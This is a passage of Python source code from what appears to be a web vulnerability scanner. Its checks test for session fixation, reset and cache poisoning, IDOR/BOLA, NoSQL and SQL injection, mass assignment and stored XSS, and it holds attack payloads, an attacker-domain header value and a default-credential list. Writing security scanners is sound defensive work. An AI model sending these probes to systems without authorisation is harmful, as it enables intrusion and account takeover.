              remed='Update the plugin; hide readme.txt via server rules.',
              confidence="candidate" if old else "confirmed", location=path))


def c_source_disclosure(ctx, add):
    """Backup file per halaman hasil crawl: <page>.bak/.old/.save/.swp/~ yang memuat
    signature kode sumber (bukan HTML hasil render)."""
    surf = ctx.surface(full=True)
    pages = [p.split("?")[0] for p in surf.pages if "." in p.split("/")[-1]][:5]
    sig = re.compile(r"<\?php|import\s+\w+\s+from|require\(|function\s+\w+\s*\(|#include|package\s+[\w.]+;|using\s+System")
    for page in pages:
        for suffix in [".bak", ".old", ".save", "~", ".swp"]:
            r = ctx.client.get(page + suffix)
            if r.status == 200 and r.body and not ctx.is_missing(r) and sig.search(r.body) \
                    and "<html" not in r.body[:300].lower():
                add(F("HIGH", f"Page backup/source exposed: {page}{suffix}",
                      'The page backup copy contains source code (signature detected) — leaking logic, comments, and potentially hardcoded credentials.',
                      evidence=r.body[:100].replace("\n", " "), cwe="CWE-540",
                      owasp="A05:2021", cvss=7.5,
                      remed='Remove backup files from the webroot; block .bak/.old/.swp extensions at the server.',
                      confidence="confirmed", location=page + suffix))
                return


def _session_cookie(resp):
    for raw in resp.hdr_all("set-cookie"):
        name = raw.split("=", 1)[0].strip().lower()
        if any(k in name for k in ("session", "sess", "sid", "auth", "token")):
            return raw.split(";")[0]
    return ""


def c_session_fixation(ctx, add):
    """Session fixation: nilai cookie sesi yang ditetapkan SEBELUM login harus BERUBAH
    setelah login berhasil. Bila tetap sama -> probable fixation."""
    surf = ctx.surface(full=True)
    for form in surf.forms:
        if form["method"] != "POST":
            continue
        names = [i.lower() for i in form["inputs"]]
        if not any("pass" in n for n in names):
            continue
        page = ctx.client.get(form["page"])
        pre = _session_cookie(page)
        if not pre:
            continue
        uname = next((i for i in form["inputs"] if "user" in i.lower() or "email" in i.lower()),
                     form["inputs"][0] if form["inputs"] else "username")
        pw = next((i for i in form["inputs"] if "pass" in i.lower()), "password")
        resp = ctx.client.post(form["action"],
                               data=f"{uname}=ptk-fixation-probe&{pw}=ptk-probe-{ctx.marker}",
                               headers={"Cookie": pre})
        post = _session_cookie(resp)
        if resp.status in (200, 301, 302, 303, 307) and (not post or post == pre):
            add(F("MEDIUM", f"Session fixation indication: {form['action']}",
                  f"Session cookie before login ({pre.split('=')[0]}=…) is not rotated after the login POST — the application accepts a session ID set before authentication (fixation pattern). The probe uses random credentials; if the application rotates only on SUCCESSFUL login, verify manually with a test account.",
                  evidence='identical session cookie before/after the login POST', cwe="CWE-384",
                  owasp="A07:2021", cvss=6.5,
                  remed='Regenerate the session ID whenever the authentication level changes.',
                  confidence="probable", location=form["action"]))
            return


def c_password_reset_poisoning(ctx, add):
    """Password-reset poisoning: endpoint lupa password yang membangun tautan reset
    dari X-Forwarded-Host terkontrol attacker."""
    evil = f"evil-{ctx.marker}.example.com"
    surf = ctx.surface(full=True)
    cands = [p.split("?")[0] for p in surf.pages
             if any(k in p.lower() for k in ("forgot", "reset", "recover"))]
    for guess in ["/forgot", "/forgot-password", "/reset-password", "/account/forgot"]:
        if guess not in cands:
            r = ctx.client.get(guess)
            if r.status and not ctx.is_missing(r):
                cands.append(guess)
    for path in list(dict.fromkeys(cands))[:3]:
        r = ctx.client.post(path, data="email=victim%40example.com",
                            headers={"X-Forwarded-Host": evil})
        if evil in (r.body or ""):
            add(F("HIGH", f"Password Reset Poisoning: {path}",
                  "The forgot-password flow response contains the host from X-Forwarded-Host — the reset link sent to the victim can point to the attacker's domain.",
                  evidence=f"host {evil} reflected in the reset response", cwe="CWE-640",
                  owasp="A07:2021", cvss=7.4,
                  remed="Build reset links from the server configuration's canonical host, not request headers.",
                  confidence="probable", location=path))
            return
        rg = ctx.client.get(path, headers={"X-Forwarded-Host": evil})
        if evil in (rg.body or ""):
            add(F("MEDIUM", f"Host header reflected on the reset page: {path}",
                  'The reset page reflects X-Forwarded-Host — check the reset email link generation flow (password reset poisoning indication).',
                  evidence=evil, cwe="CWE-640", owasp="A07:2021", cvss=5.9,
                  remed='Use the canonical host for all outbound links.',
                  confidence="probable", location=path))
            return


def c_cache_poisoning(ctx, add):
    """Web cache poisoning: nilai X-Forwarded-Host yang tersimpan harus muncul di
    request NORMAL berikutnya (tanpa header itu) — urutan: baseline, racun, verifikasi."""
    surf = ctx.surface(full=True)
    pages = list(dict.fromkeys(p.split("?")[0] for p in surf.pages
                               if p.startswith("/")))[:10] or ["/"]
    evil = f"evil-{ctx.marker}.example.com"
    for path in pages:
        first = ctx.client.get(path)
        if evil in (first.body or ""):
            continue
        ctx.client.get(path, headers={"X-Forwarded-Host": evil,
                                        "X-Forwarded-Scheme": "http"})
        verify = ctx.client.get(path)
        if evil in (verify.body or ""):
            add(F("HIGH", f"Web Cache Poisoning confirmed: {path}",
                  'The unverified header value (X-Forwarded-Host) sent by the scan reappears in the next normal request — the response is stored in the shared cache and will be served to other visitors.',
                  evidence=f"{evil} persisted in cache for {path}", cwe="CWE-349",
                  owasp="A05:2021", cvss=7.4,
                  remed='Include response-affecting headers in the cache key (Vary) or ignore X-Forwarded-* from direct clients.',
                  confidence="confirmed", location=path))
            return


# ------------------------------------------------------------ enterprise checks (v3.1)

STACK_SIGNS = ["traceback (most recent call last)", "java.lang.", "javax.servlet",
               "stack trace", "org.springframework", "whoops, looks like something went wrong",
               "laravel\\", "asp.net", "system.web.http", "django version", "werkzeug",
               "valueerror", "typeerror:", "nullreferenceexception", "fatal error:",
               "on line ", "in <module>", "com.sun.", "node_modules", "at function."]


def c_error_disclosure(ctx, add):
    """Error verbose: picu error di parameter & nilai baseline; signature stack trace
    yang TIDAK ada di respons normal = disclosure."""
    for base, pname, method, orig in ctx.param_targets(limit=14):
        base_r = ctx.req_param(base, pname, "1", method, orig)
        r = ctx.req_param(base, pname, "\x00ptk-error-probe", method, orig)
        low, blow = (r.body or "").lower(), (base_r.body or "").lower()
        hits = [s for s in STACK_SIGNS if s in low and s not in blow]
        if hits:
            add(F("MEDIUM", f"Verbose error / stack trace exposed: {base} param '{pname}'",
                  f"Malformed input triggered an error page containing an internal stack trace ({hits[0]}…) — helps an attacker map the framework and server paths.",
                  evidence=f"signature: {hits[0]}", cwe="CWE-209",
                  owasp="A05:2021 Security Misconfiguration", cvss=5.3,
                  remed='Disable debug mode in production; show a generic error page; log details only server-side.',
                  confidence="probable", location=base, param=pname))
            return


JS_LIB_CVES = [
    (r"jquery[-@/]?(\d+\.\d+\.\d+)", "jQuery", {
        "1.11.1": 'CVE-2015-9251 (XSS via cross-domain AJAX)', "1.12.4": 'several old XSS/DOM CVEs',
        "2.2.4": "CVE-2019-11358 (prototype pollution)", "3.4.1": "CVE-2020-11022/11023 (XSS via htmlPrefilter)"}),
    (r"bootstrap[-@/]?(\d+\.\d+\.\d+)", "Bootstrap", {
        "3.3.7": "CVE-2019-8331 (XSS tooltip/popover)", "4.3.1": "CVE-2019-8331 (XSS tooltip/popover)"}),
    (r"angular(?:\.min)?\.js|angular[-@/](\d+\.\d+\.\d+)", "AngularJS", {
        "1.7.9": "AngularJS EOL — CVE sandbox escape beragam", "1.5.11": 'AngularJS EOL — upgrade required'}),
    (r"lodash[-@/]?(\d+\.\d+\.\d+)", "Lodash", {
        "4.17.15": "CVE-2020-8203 (prototype pollution)", "4.17.20": "CVE-2021-23337 (command injection via template)"}),
]


def c_js_libraries(ctx, add):
    """Library JS usang (kandidat CVE berbasis versi) + source map ter-expose."""
    surf = ctx.surface(full=True)
    home = surf.homepage or ctx.client.get("/")
    srcs = re.findall(r'''<script[^>]+src\s*=\s*["']([^"']+)["']''', home.body or "", re.I)
    seen = set()
    for src in srcs:
        low = src.lower()
        for pat, lib, table in JS_LIB_CVES:
            m = re.search(pat, low)
            if m and lib not in seen:
                seen.add(lib)
                ver = m.group(1) if m.groups() else ""
                note = table.get(ver, "old version — check this library's CVEs")
                # Perbandingan versi presisi (packaging, PEP 440) menggantikan
                # potong-string manual: versi terdeteksi <= versi rentan
                # tertinggi yang dikenal di tabel -> kandidat usang.
                try:
                    from packaging.version import Version as _PV
                    _in_range = bool(table) and _PV(ver) <= max(_PV(v) for v in table)
                except Exception:
                    _in_range = False
                if ver and (ver in table or _in_range or
                            (int(ver.split(".")[0]) <= 2 and lib == "jQuery")):
                    add(F("MEDIUM", f"Outdated JS library: {lib} {ver}",
                          f"{lib} {ver} detected from the script file name. Version note: {note}. Candidate status based on file version — verify that this is really the version being served.",
                          evidence=src[:120], cwe="CWE-1035",
                          owasp="A06:2021 Vulnerable & Outdated Components", cvss=5.4,
                          remed=f"Upgrade {lib} to the latest supported version.",
                          confidence="candidate", location=src[:120]))
        # source map untuk script same-host
        if src.startswith("/") and src.endswith(".js"):
            r = ctx.client.get(src + ".map")
            if r.status == 200 and not ctx.is_missing(r) and (
                    '"sourcesContent"' in (r.body or "") or '"mappings"' in (r.body or "")):
                add(F("HIGH", f"JavaScript source map exposed: {src}.map",
                      "The source map contains the application's original source code (sourcesContent) — an attacker obtains the complete frontend source code including endpoints and logic.",
                      evidence="signature source map valid", cwe="CWE-200",
                      owasp="A05:2021", cvss=7.5,
                      remed='Do not deploy .map files to production, or restrict access to them.',
                      confidence="confirmed", location=src + ".map"))


def c_sri_and_session(ctx, add):
    """SRI hilang untuk script eksternal, token session di URL, mixed content."""
    surf = ctx.surface(full=False)
    home = surf.homepage or ctx.client.get("/")
    body = home.body or ""
    for tag in re.findall(r"<script[^>]+>", body, re.I):
        m = re.search(r'''src\s*=\s*["'](https?://[^"']+)["']''', tag, re.I)
        if m and urlparse(m.group(1)).hostname not in (None, ctx.client.host):
            if "integrity=" not in tag:
                add(F("LOW", 'External script without Subresource Integrity (SRI)',
                      'A cross-origin script is loaded without an integrity attribute — if the CDN is compromised, malicious code runs on this page undetected.',
                      evidence=m.group(1)[:120], cwe="CWE-353",
                      owasp="A08:2021 Software & Data Integrity Failures", cvss=3.1,
                      remed='Add integrity="sha384-..." + crossorigin to external scripts.',
                      confidence="confirmed", location="/"))
                break
    if ctx.client.scheme == "https":
        mixed = re.findall(r'''(?:src|href)\s*=\s*["'](http://[^"']+)["']''', body, re.I)
        if mixed:
            add(F("MEDIUM", f"Mixed content: {len(mixed)} HTTP resource on an HTTPS page",
                  'Active/passive resources are loaded over plain HTTP on an HTTPS page — can be modified by a MITM.',
                  evidence=mixed[0][:120], cwe="CWE-319", owasp="A02:2021", cvss=5.3,
                  remed='Load all resources over HTTPS.', confidence="confirmed", location="/"))
    sess = re.findall(r'''(?:href|src|action)\s*=\s*["']([^"']*(?:jsessionid|phpsessid|sessionid|sid)=[A-Za-z0-9]{8,}[^"']*)["']''',
                      body, re.I)
    if sess:
        add(F("MEDIUM", 'Session token in URL',
              'A session ID in the URL leaks via server logs, Referer, and browser history — it can be used to hijack the session.',
              evidence=sess[0][:120], cwe="CWE-598",
              owasp="A07:2021 Identification & Authentication Failures", cvss=5.4,
              remed='Pass the session id only via an HttpOnly cookie; disable URL rewriting for sessions.',
              confidence="confirmed", location="/"))


def c_auth_surface(ctx, add):
    """Permukaan autentikasi: form login via HTTP polos, autocomplete password,
    dan form upload? (upload di check tersendiri)."""
    surf = ctx.surface(full=True)
    for form in surf.forms:
        page_r = ctx.client.get(form["page"])
        has_pw = "password" in [i.lower() for i in form["inputs"]] or \
            re.search(r'type\s*=\s*["\']password', page_r.body or "", re.I)
        if not has_pw:
            continue
        if ctx.client.scheme == "http":
            add(F("HIGH", f"Login form/credentials sent over plain HTTP: {form['action']}",
                  'The page contains a password field but the target is accessed over HTTP without TLS — credentials can be intercepted on the network.',
                  evidence=f"form at {form['page']}, scheme=http", cwe="CWE-319",
                  owasp="A02:2021 Cryptographic Failures", cvss=7.4,
                  remed='Force HTTPS for the entire login flow (redirect + HSTS).',
                  confidence="confirmed", location=form["action"]))
        m = re.search(r'<input[^>]+type\s*=\s*["\']password["\'][^>]*>', page_r.body or "", re.I)
        if m and "autocomplete" not in m.group(0).lower():
            add(F("LOW", f"Password field without a proper autocomplete attribute: {form['action']}",
                  'Without autocomplete="current-password"/"new-password", browsers and password managers behave inconsistently (and legacy autofill may store credentials in unsafe places).',
                  evidence=m.group(0)[:120], cwe="CWE-525", owasp="A07:2021", cvss=3.1,
                  remed='Set the correct autocomplete on password fields.',
                  confidence="probable", location=form["action"]))
        break


def c_upload_surface(ctx, add):
    """Form upload file: deteksi, lalu (deep) coba unggah file teks benign bermarker
    dan cari apakah file itu dapat diakses kembali tanpa autentikasi."""
    surf = ctx.surface(full=True)
    home = surf.homepage or ctx.client.get("/")
    body = home.body or ""
    upload_forms = [(f, "multipart" in (f.get("enctype") or ""))
                    for f in surf.forms if f.get("has_file")]
    if not upload_forms and re.search(r'type\s*=\s*["\']file', body, re.I):
        upload_forms.append(({"action": "/", "page": "/"}, True))
    for form, is_multi in upload_forms[:1]:
        action = form["action"]
        add(F("MEDIUM", f"File upload form found: {action}",
              'A form with a file input is reachable. Ensure authentication, server-side type validation, antivirus scanning, and that files are stored outside the webroot / without execution.',
              evidence=f"page={form['page']} multipart={is_multi}", cwe="CWE-434",
              owasp="A01:2021 Broken Access Control", cvss=5.3,
              remed='Whitelist extensions + server-side MIME sniffing; store outside the webroot; use random names.',
              confidence="probable", location=action))
        # percobaan unggah benign (hanya membuktikan, tanpa muatan berbahaya)
        fname = f"ptk-{ctx.marker}.txt"
        content = f"PTK-UPLOAD-PROBE-{ctx.marker}"
        boundary = f"----PTK{ctx.marker}"
        mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
              f"filename=\"{fname}\"\r\nContent-Type: text/plain\r\n\r\n{content}\r\n"
              f"--{boundary}--\r\n")
        up = ctx.client.post(action, data=mp,
                             headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        candidates = [up.body or ""] + [ctx.client.get(p).body or "" for p in
                                        (f"/uploads/{fname}", f"/files/{fname}",
                                         f"/media/{fname}", f"/static/uploads/{fname}",
                                         f"/upload/{fname}")]
        if any(content in c for c in candidates):
            add(F("HIGH", f"File upload WITHOUT authentication confirmed: {action}",
                  'The probe text file was uploaded successfully and its contents can be accessed again without credentials — a classic path to a web shell if file types are not strictly validated.',
                  evidence=f"file {fname} served back with the probe marker",
                  cwe="CWE-434", owasp="A01:2021", cvss=8.6,
                  remed='Require upload authentication+authorization; whitelist types; store outside the webroot.',
                  confidence="confirmed", location=action))


SERIAL_SIGNS = [
    (r"rO0ABXNy|aced0005", "Java serialized object (Base64/hex)", "CWE-502"),
    (r"O:\d+:\"[^\"]+\":\d+:\{", "PHP serialized object", "CWE-502"),
    (r"__VIEWSTATE", "ASP.NET ViewState", "CWE-502"),
    (r"AAEAAAD/////", ".NET BinaryFormatter/LosFormatter blob", "CWE-502"),
]


def c_deserialization_surface(ctx, add):
    surf = ctx.surface(full=False)
    home = surf.homepage or ctx.client.get("/")
    corpus = (home.body or "") + " ".join(home.hdr_all("set-cookie"))
    for pat, label, cwe in SERIAL_SIGNS:
        if re.search(pat, corpus):
            add(F("LOW", f"Serialized data detected: {label}",
                  'A serialized data pattern appears in the page/cookie. Deserializing untrusted data is a classic source of RCE — ensure input is never deserialized without integrity verification (MAC/signature).',
                  evidence=f"pattern {label}", cwe=cwe,
                  owasp="A08:2021 Software & Data Integrity Failures", cvss=3.7,
                  remed='Avoid native deserialization for client data; use JSON + signatures.',
                  confidence="candidate", location="/"))
            return


def c_security_txt_robots(ctx, add):
    r = ctx.client.get("/.well-known/security.txt")
    if r.status == 404 or ctx.is_missing(r):
        r2 = ctx.client.get("/security.txt")
        if r2.status == 404 or ctx.is_missing(r2):
            add(F("INFO", 'security.txt not found',
                  'Without /.well-known/security.txt, security researchers have difficulty finding the official vulnerability reporting channel (RFC 9116).',
                  cwe="CWE-1059", owasp="A05:2021", cvss=0.0,
                  remed='Publish a security.txt containing contact details and a disclosure policy.',
                  confidence="confirmed", location="/.well-known/security.txt"))
    surf = ctx.surface(full=False)
    dis = getattr(surf, "robots_paths", []) if surf else []
    interesting = [p for p in dis if any(k in p.lower() for k in
                   ("admin", "backup", "private", "internal", "config", "secret", ".git"))]
    if interesting:
        add(F("LOW", 'robots.txt discloses sensitive paths',
              'Disallow entry points to a sensitive area: ' + ", ".join(interesting[:5]) +
              " — robots.txt can be read by anyone and becomes the attacker's initial map.",
              evidence=", ".join(interesting[:5]), cwe="CWE-200", owasp="A05:2021",
              cvss=3.1, remed='Do not rely on robots.txt to hide paths; protect them at the server.',
              confidence="confirmed", location="/robots.txt"))


SENSITIVE_JSON_KEYS = ["password", "passwd", "password_hash", "credit_card", "card_number",
                       "cvv", "ssn", "secret", "api_key", "apikey", "access_token",
                       "private_key", "otp", "pin"]


def c_api_sensitive_data(ctx, add):
    """Endpoint API yang dapat diakses TANPA autentikasi dan memuat data sensitif/PII."""
    surf = ctx.surface(full=True)
    endpoints = list(dict.fromkeys(
        [e for e in surf.js_endpoints] +
        [p.split("?")[0] for p in surf.param_urls if p.startswith("/api")]))[:6]
    email_re = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
    for ep in endpoints:
        r = ctx.client.get(ep)
        if r.status != 200 or not r.body or ctx.is_missing(r):
            continue
        low = r.body.lower()
        keys = [k for k in SENSITIVE_JSON_KEYS if f'"{k}"' in low]
        emails = email_re.findall(r.body)
        if keys:
            add(F("HIGH", f"Unauthenticated API leaks sensitive fields: {ep}",
                  f"The public response contains fields: {', '.join(keys[:5])}. This API can be accessed without any credentials from the scan session.",
                  evidence=f"keys={keys[:5]}", cwe="CWE-200",
                  owasp="A01:2021 Broken Access Control (API3: Excessive Data Exposure)", cvss=7.5,
                  remed='Require authentication+authorization per object; filter response fields on the server (DTO).',
                  confidence="confirmed", location=ep))
        elif len(emails) >= 2:
            add(F("MEDIUM", f"Unauthenticated API leaks email addresses: {ep}",
                  f"{len(emails)} email addresses found in a public response without authentication.",
                  evidence=f"contoh: {emails[0][:40]}…", cwe="CWE-359",
                  owasp="A01:2021 (API3: Excessive Data Exposure)", cvss=5.3,
                  remed='Restrict PII data to authenticated data owners only.',
                  confidence="confirmed", location=ep))


def c_broken_access_idor(ctx, add):
    """IDOR/BOLA indikator: parameter ID numerik — objek tetangga dapat diakses tanpa
    autentikasi dan memuat data yang BERBEDA (dilabeli probable: konteks kepemilikan
    tetap wajib diverifikasi manual dengan dua akun uji)."""
    for base, pname, method, orig in ctx.param_targets(limit=14):
        if method != "GET":
            continue
        orig_val = None
        if orig and "?" in orig:
            for pair in orig.split("?", 1)[1].split("&"):
                if pair.startswith(pname + "="):
                    orig_val = pair.split("=", 1)[1]
        if not orig_val or not orig_val.isdigit():
            continue
        n = int(orig_val)
        r1 = ctx.req_param(base, pname, str(n), method, orig)
        r2 = ctx.req_param(base, pname, str(n + 1), method, orig)
        if r1.status == 200 and r2.status == 200 and r1.body and r2.body \
                and not ctx.is_missing(r2):
            sim = similarity(r1.body, r2.body)
            has_data = re.search(r"@|user|nama|name|email|order|account", r2.body, re.I)
            if sim < 0.85 and has_data:
                add(F("HIGH", f"IDOR/BOLA indication: {base} param '{pname}'",
                      f"Object {pname}={n} and {pname}={n + 1} are both accessible WITHOUT authentication and their contents differ — a classic broken object level authorization pattern. Manual verification with 2 test accounts remains mandatory to confirm that data really is mixed between users.",
                      evidence=f"sim({n},{n+1})={sim:.2f}, keduanya HTTP 200",
                      cwe="CWE-639", owasp="A01:2021 Broken Access Control (API1: BOLA)",
                      cvss=7.5, remed='Check object ownership on the server on EVERY request.',
                      confidence="probable", location=base, param=pname))
                return


def c_nosql_api(ctx, add):
    """NoSQL injection di endpoint API JSON: operator $gt mengubah [] menjadi data."""
    surf = ctx.surface(full=True)
    endpoints = list(dict.fromkeys(
        [e for e in surf.js_endpoints if e.startswith("/api")]))
    # Prioritaskan endpoint mirip pencarian (permukaan NoSQL alami);
    # daftar endpoint terurut alfabetis (determinisme v1.8) — cap buta
    # bisa menggeser endpoint target keluar daftar (regresi v1.10).
    endpoints.sort(key=lambda e: (0 if any(k in e.lower() for k in
                     ("search", "query", "find", "lookup", "filter"))
                     else 1, e))
    endpoints = endpoints[:8]
    for ep in endpoints:
        hdr = {"Content-Type": "application/json"}
        bad = ctx.client.post(ep, data='{"q": "ptk-invalid-zzz"}', headers=hdr)
        for payload in ['{"q": {"$gt": ""}}', '{"id": {"$gt": 0}}', '{"q": {"$ne": null}}']:
            r = ctx.client.post(ep, data=payload, headers=hdr)
            if r.status == 200 and r.body and len(r.body) > 60 \
                    and (bad.status != 200 or len(r.body) > len(bad.body or "") * 2 + 40) \
                    and re.search(r'"(id|name|email|user)"', r.body):
                add(F("HIGH", f"NoSQL Injection in API: {ep}",
                      'A JSON query with MongoDB operators ($gt/$ne) returned data, while an invalid value did not — JSON input is passed through to the NoSQL query.',
                      evidence=f"payload={payload} -> {len(r.body)} byte data",
                      cwe="CWE-943", owasp="A03:2021 Injection (API8)", cvss=8.6,
                      remed='Validate input types (strings only); reject keys starting with $ or containing dots.',
                      confidence="probable", location=ep))
                return


_ID_SEG = re.compile(r"/(\d{2,}|[0-9a-fA-F]{8}-[0-9a-fA-F-]{27,})(/|$)")


def c_bola_matrix(ctx, add):
    """Dual-account BOLA matrix (Fase 4): URL ber-ID objek yang terbaca oleh
    akun A diputar ulang dengan kredensial akun B dan tanpa auth. Confirmed
    hanya bila B membaca objek A (kemiripan konten tinggi) sementara akses
    anonim ditolak — pola bukti tiga arah, bukan tebakan satu respons."""
    auth_b = ctx.opts.get("auth_b") or {}
    if not auth_b:
        ctx.L("  [bola] single-account scan — dual-account BOLA matrix "
              "skipped (needs a second credential)")
        return
    from netclient import Client as _Client
    b_client = _Client(ctx.target, timeout=ctx.client.timeout,
                       extra_headers=auth_b.get("headers") or {},
                       cookie=auth_b.get("cookie", ""))
    b_client.proxy = ctx.client.proxy
    anon = _Client(ctx.target, timeout=ctx.client.timeout)
    anon.proxy = ctx.client.proxy
    surf = ctx.surface(full=True)
    cands, seen = [], set()
    for url in list(surf.pages) + list(surf.param_urls) + \
            [f["action"] for f in surf.forms]:
        path = url.split("?")[0]
        if _ID_SEG.search(path) and path not in seen:
            seen.add(path)
            cands.append(url)
    ctx.L(f"  [bola] {len(cands)} object-URL candidates for cross-account replay")
    checked = 0
    for url in cands[:12]:
        if ctx.cancelled():
            return
        ra = ctx.client.get(url)
        if ra.status != 200 or not ra.body or len(ra.body) < 40 \
                or ctx.is_missing(ra):
            continue
        checked += 1
        rn = anon.get(url)
        if rn.status == 200 and rn.body and \
                similarity(rn.body, ra.body) >= 0.85:
            continue                      # objek publik — bukan BOLA
        rb = b_client.get(url)
        if rb.status == 200 and rb.body and \
                similarity(rb.body, ra.body) >= 0.85:
            m = re.search(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",
                          ra.body)
            marker = m.group(0)[:60] if m else (ra.body[:60].replace("\n", " "))
            add(F("HIGH", f"BOLA: cross-account object access: {url}",
                  "Account B's credentials read an object that account A accessed, while unauthenticated access is denied — object-level authorization is not enforced per owner (Broken Object Level Authorization).",
                  evidence=f"A=200, B=200 (similarity {similarity(rb.body, ra.body):.2f}), anonymous={rn.status}; A-object marker: {marker}",
                  cwe="CWE-639", owasp="A01:2021 Broken Access Control (API1: BOLA)",
                  cvss=8.1,
                  remed="Authorize every object access against the authenticated owner's scope on the server; never rely on unguessable IDs.",
                  confidence="confirmed", location=url))
    ctx.L(f"  [bola] replayed {checked} readable object URLs across accounts")


_PRIV_FIELDS = {"role": "admin", "is_admin": True, "isAdmin": True,
                "admin": True, "verified": True, "balance": 1000000,
                "account_type": "admin"}


def _json_seed_bodies(ctx, ep):
    """Bangun body JSON benih untuk satu endpoint dari sinyal crawl:
    nama field form pada action yang sama > pola login > generik."""
    seeds = []
    low = ep.lower()
    for form in ctx.surface().forms:
        if form.get("action") == ep and form.get("inputs"):
            seeds.append({n: "ptk" for n in form["inputs"][:6]})
            break
    if any(k in low for k in ("login", "auth", "signin", "token", "session")):
        seeds.append({"username": "ptk_user", "password": "ptk_pass"})
        seeds.append({"email": "ptk@example.invalid", "password": "ptk_pass"})
    seeds.append({"id": 1, "q": "ptk", "name": "ptk"})
    out, seen = [], set()
    for sd in seeds:
        k = json.dumps(sd, sort_keys=True)
        if k not in seen:
            seen.add(k)
            out.append(sd)
    return out[:3]


def c_json_fuzz(ctx, add):
    """Fuzzing JSON/REST terstruktur (Fase 4) — melampaui c_nosql_api
    (operator datar): (1) mass assignment field privilegi, (2) type
    confusion per field, (3) injeksi bersarang (objek/array satu level).
    Semua klaim berbasis bukti respons yang terukur terhadap baseline
    endpoint yang sama; tidak ada klaim dari satu anomali status saja."""
    surf = ctx.surface(full=True)
    endpoints = list(dict.fromkeys(
        [e for e in surf.js_endpoints if e.startswith("/api")] +
        [f["action"] for f in surf.forms
         if f.get("method", "GET").upper() == "POST"] +
        [p.split("?")[0] for p in surf.param_urls
         if p.startswith("/api")]))[:6]
    hdr = {"Content-Type": "application/json"}
    for ep in endpoints:
        if ctx.cancelled():
            return
        for seed in _json_seed_bodies(ctx, ep):
            base = ctx.client.post(ep, data=json.dumps(seed), headers=hdr)
            if base.status == 0 or ctx.is_missing(base):
                break
            base_low = (base.body or "").lower()
            # --- (1) mass assignment -------------------------------------
            ma = dict(seed)
            ma.update(_PRIV_FIELDS)
            r = ctx.client.post(ep, data=json.dumps(ma), headers=hdr)
            if r.status in (200, 201) and r.body:
                echoed = [k for k, v in _PRIV_FIELDS.items()
                          if f'"{k}"' in r.body
                          and json.dumps(v) in r.body.replace(" ", "")]
                new_echo = [k for k in echoed
                            if f'"{k}"' not in (base.body or "")]
                if new_echo:
                    add(F("HIGH", f"Mass assignment in JSON API: {ep}",
                          f"The endpoint accepts and reflects privileged fields it should never take from clients: {', '.join(new_echo[:4])}. Submitting them in the request body is reflected in the response — server-side authorization fields are client-controllable.",
                          evidence=f"injected fields reflected: {new_echo[:4]} (status {r.status})",
                          cwe="CWE-915", owasp="A01:2021 Broken Access Control (API6: Mass Assignment)",
                          cvss=8.1,
                          remed="Bind request bodies to an explicit DTO/allowlist of client-settable fields; never bind persistence models directly.",
                          confidence="confirmed", location=ep))
            # --- (2)+(3) per-field: type confusion + nested injection ---
            for field in [k for k, v in seed.items() if isinstance(v, str)][:3]:
                variants = [
                    ("type-confusion array", [seed[field]]),
                    ("type-confusion object", {"v": seed[field]}),
                    ("nested SQLi", {"nested": "' OR '1'='1"}),
                    ("nested SQLi (array)", ["' OR '1'='1"]),
                ]
                for label, val in variants:
                    mut = dict(seed)
                    mut[field] = val
                    r = ctx.client.post(ep, data=json.dumps(mut), headers=hdr)
                    if not r.body:
                        continue
                    low = r.body.lower()
                    new_errs = [e for e in SQL_ERRORS
                                if e in low and e not in base_low]
                    if new_errs and r.status != base.status:
                        add(F("HIGH", f"Injection via JSON {label}: {ep} field '{field}'",
                              f"A structured mutation ({label}) of field '{field}' triggers database error signatures absent from the baseline response — the API passes nested/typed JSON values into its query layer unsanitized.",
                              evidence=f"error signature: {new_errs[0][:60]}",
                              cwe="CWE-89", owasp="A03:2021 Injection", cvss=8.6,
                              remed="Validate JSON field types strictly server-side; use parameterized queries; reject nested objects where scalars are expected.",
                              confidence="probable", location=ep, param=field))
                        break
            # satu seed per endpoint cukup untuk fuzz terstruktur
            break


DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "1234"),
                 ("tomcat", "tomcat"), ("root", "root"), ("admin", "admin123"),
                 ("user", "user"), ("guest", "guest")]



_VERIFY_HDR = {"X-Requested-With": "VanthexVerify"}


def c_stored_xss(ctx, add):
    """Stored XSS: tanam payload marker unik ke form POST non-auth, lalu
    buktikan payload tampil MENTAH pada GET segar halaman lain — respons
    POST sendiri tidak pernah dihitung (itu reflected, bukan stored).
    Gerbang soft-404 pada respons POST membuat check ini mati total di
    aplikasi SPA catch-all (regresi v3.2 tidak boleh terulang)."""
    surf = ctx.surface(full=True)
    forms = [f for f in surf.forms
             if (f.get("method") or "GET").upper() == "POST"]
    # Halaman form umum yang mungkin tidak terjangkau crawl terbatas
    # di-probe langsung (pola yang sama dengan daftar path terkurasi di
    # check lain). Gerbang is_missing membuat probe ini mati di SPA
    # catch-all: shell soft-404 tidak pernah di-parse form-nya.
    _known = {(f.get("action"), f.get("page")) for f in forms}
    for _pg in ("/guestbook", "/comments", "/comment", "/feedback",
                "/contact", "/reviews", "/review", "/testimonials",
                "/forum", "/posts", "/discuss", "/support"):
        if _pg in (surf.pages or []):
            continue
        try:
            _r = ctx.client.get(_pg)
        except Exception:
            continue
        if _r.status != 200 or "<form" not in (_r.body or "").lower():
            continue
        if ctx.is_missing(_r):
            continue
        _tmp = crawl_mod.Surface()
        try:
            crawl_mod._extract_bs4(_r.body, _pg, lambda v, i: None,
                                   _tmp, ctx.client.host)
        except Exception:
            continue
        for _f in _tmp.forms:
            if (_f.get("method") or "GET").upper() != "POST":
                continue
            _k = (_f.get("action"), _f.get("page"))
            if _k not in _known:
                forms.append(_f)
                _known.add(_k)
    planted = []
    for form in forms:
        if len(planted) >= 5:
            break
        action = form.get("action") or form.get("page") or "/"
        low = action.lower()
        if any(k in low for k in ("login", "signin", "sign-in", "auth",
                                  "logout", "register", "signup", "password")):
            continue
        inputs = [i for i in (form.get("inputs") or [])
                  if isinstance(i, str) and i
                  and not any(k in i.lower() for k in
                              ("pass", "email", "token", "csrf", "file"))]
        if not inputs:
            continue
        marker = f"vx{ctx.marker}{len(planted)}"
        payload = f"<svg/onload=alert('{marker}')>"
        data = "&".join(f"{quote(n, safe='')}={quote(payload, safe='')}"
                        for n in inputs[:4])
        try:
            resp = ctx.client.post(action, data=data)
        except Exception:
            continue
        if resp.status == 0 or ctx.is_missing(resp):
            continue
